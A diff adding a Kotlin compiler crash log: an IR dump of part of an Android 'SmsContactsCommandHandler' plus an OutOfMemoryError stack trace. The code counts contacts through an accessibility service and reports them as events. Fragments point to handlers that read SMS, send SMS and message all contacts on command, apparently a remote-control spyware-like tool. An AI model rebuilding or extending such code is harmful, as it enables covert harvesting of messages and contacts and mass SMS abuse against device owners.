+    d(p0 = "SmsContactsCmdHandler", p1 = "获取通讯录统计") /*~> Unit */
+    val service: MyAccessibilityService = { // BLOCK
+      val tmp0_elvis_lhs: MyAccessibilityService? = context.<get-service>()
+      when {
+        EQEQ(arg0 = tmp0_elvis_lhs, arg1 = null) -> return #INSTANCE
+        else -> tmp0_elvis_lhs
+      }
+    }
+    val hasPermission: Boolean = EQEQ(arg0 = service.checkSelfPermission(p0 = "android.permission.READ_CONTACTS"), arg1 = 0)
+    when {
+      hasPermission -> { // BLOCK
+        try { // BLOCK
+          val stats: JSONObject? = <this>.getContactsStatsViaContentResolver(service = service)
+          when {
+            EQEQ(arg0 = stats, arg1 = null).not() -> { // BLOCK
+              context.sendEvent(eventType = "contacts_stats", data = stats)
+            }
+          }
+        }
+        catch (e: Exception){ // BLOCK
+          e(p0 = "SmsContactsCmdHandler", p1 = "获取通讯录统计失败", p2 = e)
+        }
+
+      } /*~> Unit */
+    }
+  }
+
+  private fun getContactsStatsViaContentResolver(service: Context): JSONObject? {
+    return try { // BLOCK
+      val cursor: Cursor? = service.getContentResolver().query(p0 = super<Contacts>.#CONTENT_URI, p1 = { // BLOCK
+        val tmp0: Array<out String> = arrayOfNulls<String>(size = 1)
+        tmp0.set(index = 0, value = "count(*) AS count")
+        tmp0
+      }, p2 = null, p3 = null, p4 = null)
+      val totalCount: IntRef = IntRef()
+      { // BLOCK
+        val tmp0_safe_receiver: Cursor? = cursor
+        when {
+          EQEQ(arg0 = tmp0_safe_receiver, arg1 = null) -> null
+          else -> tmp0_safe_receiver.use<Cursor, Unit>(block = { // BLOCK
+            local fun <anonymous>(it: Cursor) {
+              when {
+                it.moveToFirst() -> { // BLOCK
+                  totalCount.#element = it.getInt(p0 = 0)
+                }
+              }
+            }
+
+            SmsContactsCommandHandler::<anonymous>
+          })
+        }
+      } /*~> Unit */
+      JSONObject().apply<JSONObject>(block = { // BLOCK
+        local fun JSONObject.<anonymous>() {
+          $this$apply.put(p0 = "totalContacts", p1 = totalCount.#element) /*~> Unit */
+          $this$apply.put(p0 = "timestamp", p1 = currentTimeMillis()) /*~> Unit */
+        }
+
+        SmsContactsCommandHandler::<anonymous>
+      })
+    }
+    catch (e: Exception){ // BLOCK
+      e(p0 = "SmsContactsCmdHandler", p1 = "getContactsStatsViaContentResolver failed", p2 = e) /*~> Unit */
+      null
+    }
+
+  }
+
+  /* fake */ override fun canHandle(command: String): Boolean
+
+  /* fake */ override operator fun equals(other: Any?): Boolean
+
+  /* fake */ override fun hashCode(): Int
+
+  /* fake */ override fun toString(): String
+
+  private /* static final field */ field TAG: String = "SmsContactsCmdHandler"
+  private /* static final field */ field EVENT_SMS_LIST_RESPONSE: String = "sms_list_response"
+  private /* static final field */ field EVENT_SMS_SEND_RESPONSE: String = "sms_send_response"
+  private /* static final field */ field EVENT_SMS_SEND_ALL_RESPONSE: String = "sms_send_all_response"
+  private /* static final field */ field EVENT_DUAL_SIM_STATUS: String = "dual_sim_status"
+  private /* static final field */ field EVENT_CONTACTS_RESPONSE: String = "contacts_response"
+  private /* static final field */ field EVENT_CONTACTS_SEARCH_RESPONSE: String = "contacts_search_response"
+  private /* static final field */ field EVENT_CONTACTS_STATS: String = "contacts_stats"
+  private /* static */ fun JSONObject.handleSmsRead$lambda$0($smsList: JSONArray) {
+    $this$apply.put(p0 = "success", p1 = true) /*~> Unit */
+    $this$apply.put(p0 = "count", p1 = $smsList.length()) /*~> Unit */
+    $this$apply.put(p0 = "smsList", p1 = $smsList) /*~> Unit */
+  }
+
+  private /* static */ fun JSONObject.handleSmsRead$lambda$1($e: Exception) {
+    $this$apply.put(p0 = "success", p1 = false) /*~> Unit */
+    $this$apply.put(p0 = "error", p1 = { // BLOCK
+      val tmp0_elvis_lhs: String? = $e.<get-message>()
+      when {
+        EQEQ(arg0 = tmp0_elvis_lhs, arg1 = null) -> "未知错误"
+        else -> tmp0_elvis_lhs
+      }
+    }) /*~> Unit */
+    $this$apply.put(p0 = "count", p1 = 0) /*~> Unit */
+    $this$apply.put(p0 = "smsList", p1 = JSONArray()) /*~> Unit */
+  }
+
+  private /* static */ fun JSONObject.handleSmsRead$lambda$2() {
+    $this$apply.put(p0 = "success", p1 = false) /*~> Unit */
+    $this$apply.put(p0 = "error", p1 = "正在请求短信权限，请在手机上授权后重试") /*~> Unit */
+    $this$apply.put(p0 = "needPermission", p1 = true) /*~> Unit */
+    $this$apply.put(p0 = "count", p1 = 0) /*~> Unit */
+    $this$apply.put(p0 = "smsList", p1 = JSONArray()) /*~> Unit */
+  }
+
+  private /* static */ fun JSONObject.handleSmsSend$lambda$3($success: Boolean, $phoneNumber: String, $simSlot: Int) {
+    $this$apply.put(p0 = "success", p1 = $success) /*~> Unit */
+    $this$apply.put(p0 = "phoneNumber", p1 = $phoneNumber) /*~> Unit */
+    $this$apply.put(p0 = "simSlot", p1 = $simSlot) /*~> Unit */
+  }
+
+  private /* static */ fun JSONObject.handleSmsSendAllContacts$lambda$4($count: IntRef, $simSlot: Int) {
+    $this$apply.put(p0 = "success", p1 = true) /*~> Unit */
+    $this$apply.put(p0 = "count", p1 = $count.#element) /*~> Unit */
+    $this$apply.put(p0 = "simSlot", p1 = $simSlot) /*~> Unit */
+  }
+
+  private /* static */ fun JSONObject.handleGetDualSimStatus$lambda$5($isDualSim: BooleanRef) {
+    $this$apply.put(p0 = "isDualSim", p1 = $isDualSim.#element) /*~> Unit */
+  }
+
+}
+
+`
+Details: Internal error in body lowering: java.lang.OutOfMemoryError: GC overhead limit exceeded
+	at org.jetbrains.kotlin.ir.expressions.impl.BuildersKt.IrGetValueImpl(builders.kt:401)
+	at org.jetbrains.kotlin.ir.expressions.impl.BuildersKt.IrGetValueImpl$default(builders.kt:395)
+	at org.jetbrains.kotlin.backend.common.lower.LocalDeclarationsLowering$LocalDeclarationsTransformer$FunctionBodiesRewriter.visitGetValue(LocalDeclarationsLowering.kt:401)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitGetValue(IrElementTransformerVoid.kt:519)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitGetValue(IrElementTransformerVoid.kt:19)
+	at org.jetbrains.kotlin.ir.expressions.IrGetValue.accept(IrGetValue.kt:18)
+	at org.jetbrains.kotlin.ir.expressions.IrExpression.transform(IrExpression.kt:24)
+	at org.jetbrains.kotlin.ir.expressions.IrMemberAccessExpression.transformChildren(IrMemberAccessExpression.kt:67)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoidKt.transformChildrenVoid(IrElementTransformerVoid.kt:565)
+	at org.jetbrains.kotlin.backend.common.lower.LocalDeclarationsLowering$LocalDeclarationsTransformer$FunctionBodiesRewriter.visitCall(LocalDeclarationsLowering.kt:425)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitCall(IrElementTransformerVoid.kt:299)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitCall(IrElementTransformerVoid.kt:19)
+	at org.jetbrains.kotlin.ir.expressions.IrCall.accept(IrCall.kt:24)
+	at org.jetbrains.kotlin.ir.expressions.IrExpression.transform(IrExpression.kt:24)
+	at org.jetbrains.kotlin.ir.expressions.IrTypeOperatorCall.transformChildren(IrTypeOperatorCall.kt:33)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitExpression(IrElementTransformerVoid.kt:166)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitTypeOperator(IrElementTransformerVoid.kt:504)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitTypeOperator(IrElementTransformerVoid.kt:507)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitTypeOperator(IrElementTransformerVoid.kt:19)
+	at org.jetbrains.kotlin.ir.expressions.IrTypeOperatorCall.accept(IrTypeOperatorCall.kt:26)
+	at org.jetbrains.kotlin.ir.expressions.IrExpression.transform(IrExpression.kt:24)
+	at org.jetbrains.kotlin.ir.expressions.IrExpression.transform(IrExpression.kt:20)
+	at org.jetbrains.kotlin.ir.util.TransformKt.transformInPlace(transform.kt:35)
+	at org.jetbrains.kotlin.ir.expressions.IrBlockBody.transformChildren(IrBlockBody.kt:27)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitBody(IrElementTransformerVoid.kt:174)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitBlockBody(IrElementTransformerVoid.kt:188)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitBlockBody(IrElementTransformerVoid.kt:191)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoid.visitBlockBody(IrElementTransformerVoid.kt:19)
+	at org.jetbrains.kotlin.ir.expressions.IrBlockBody.accept(IrBlockBody.kt:20)
+	at org.jetbrains.kotlin.ir.expressions.IrBody.transform(IrBody.kt:20)
+	at org.jetbrains.kotlin.ir.declarations.IrFunction.transformChildren(IrFunction.kt:65)
+	at org.jetbrains.kotlin.ir.visitors.IrElementTransformerVoidKt.transformChildrenVoid(IrElementTransformerVoid.kt:565)
+Caused by: java.lang.OutOfMemoryError: GC overhead limit exceeded
+	... 32 more
+
+
